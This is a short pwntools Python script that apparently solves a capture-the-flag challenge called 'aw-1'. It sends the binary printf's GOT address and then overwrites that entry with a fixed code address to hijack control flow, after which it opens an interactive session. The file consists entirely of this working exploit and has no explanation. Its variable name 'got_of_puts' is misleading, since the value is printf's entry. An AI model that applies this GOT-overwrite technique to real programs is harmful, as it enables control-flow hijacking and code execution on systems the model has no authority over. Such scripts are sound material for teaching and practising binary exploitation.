#!/usr/bin/env python

from pwn import *

p = process("./aw-1")

got_of_puts = p.elf.got['printf']

p.sendline("8")
print(p.recv())
p.sendline(hex(got_of_puts))
print(p.recv())
p.sendline(p64(0x0000000000400851))


p.interactive()